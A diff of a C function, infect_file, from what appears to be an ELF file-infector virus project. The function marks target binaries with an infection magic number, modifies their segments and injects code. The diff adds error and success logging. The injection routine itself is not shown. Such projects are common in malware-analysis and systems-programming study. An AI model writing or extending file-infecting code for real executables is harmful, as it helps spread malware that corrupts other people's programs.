@@ -54,22 +54,32 @@ void infect_file(const char *filename)
 	const unsigned char limit = sizeof(sm) / sizeof(sm[0]);
 
 	if ((file = get_file(filename)).size == 0)
-		return ;
-
-	if ((header = get_header(&file)) == NULL)
-		return ;
-
-	for (register unsigned char index = 0; index < limit; index++)
 	{
-		if (sm[index].f(header) == false)
-			return ;
+		ERR(filename);
+		return ;
 	}
 
-	printf("\"%s\" is infectable\n\n", filename);  // DEBUG
-	*(unsigned int*)&header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;
+	if ((header = get_header(&file)) == NULL)
+	{
+		ERR("CORRUPTION");
+		return ;
+	}
+
+	for (unsigned char index = 0; index < limit; index++)
+	{
+		if (sm[index].f(header) == false)
+		{
+			ERR("criteria");
+			return ;
+		}
+	}
+
+	OK(filename);
+	*(uint32_t *)&header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;
 
 	modify_segments(&file);
-	inject(&file, filename);
+	inject(&file);
 
-	_munmap(file.ptr, file.size);
+
+	release_file(&file);
 }
